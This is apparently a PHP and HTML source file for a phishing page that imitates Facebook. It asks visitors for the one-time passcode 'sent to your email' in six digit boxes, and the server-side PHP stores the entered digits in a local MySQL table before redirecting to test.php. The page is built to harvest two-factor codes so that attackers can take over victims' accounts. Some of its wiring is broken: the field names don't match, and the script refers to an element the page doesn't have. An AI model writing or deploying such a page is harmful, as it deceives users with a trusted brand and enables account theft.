<?php 

if (isset($_POST['submit'])) {
    echo "Form submitted<br>";
   $otp1 = $_POST['otp1'];
   $otp2 = $_POST['otp2'];
   $otp3 = $_POST['otp3'];
   $otp4 = $_POST['otp4'];
   $otp5 = $_POST['otp5']; 
   $otp6 = $_POST['otp6'];

    $host = 'localhost';
    $user = 'root';
    $pass = '';
    $dbname = 'luna';

    $conn = mysqli_connect($host, $user, $pass, $dbname);

    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
    echo "Connected to database<br>";

    $stmt = $conn->prepare("INSERT INTO lack (otp1, otp2, otp3, otp4, otp5, otp6) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("iiiiii", $otp1, $otp2, $otp3, $otp4, $otp5, $otp6);
    


    $stmt->execute();


    $stmt->close();
    $conn->close();
    // Redirect to another page after form submission
    header("Location: test.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            height: 300px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .container h1 {
            color: #1877f2;
        }
        .container .divider {
            margin: 18px 0;
        }
        .otp-input {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .otp-input input {
            width: 40px;
            height: 40px;
            margin: 0 5px;
            font-size: 18px;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 4px;

        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook</h1>
        <p>Enter the OTP sent to your email</p>
        <form action="count.php" method="post">
            <div class="otp-input">
                <input type="text" name="otp1" maxlength="1" required>
                <input type="text" name="otp2" maxlength="1" required>
                <input type="text" name="otp3" maxlength="1" required>
                <input type="text" name="otp4" maxlength="1" required>
                <input type="text" name="otp5" maxlength="1" required>
                <input type="text" name="otp6" maxlength="1" required>
            </div>
            <div class="divider"></div>
            <input type="submit" name="Submit" style="background-color: blue; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 16px;">
        </form>
    </div>
    <script>
        document.getElementById("myForm").addEventListener("submit", function(event){
            event.preventDefault(); // Prevent the default form submission
            window.location.href = "test.php"; // Redirect to the desired page
        });
    </script>
</body>
</html>
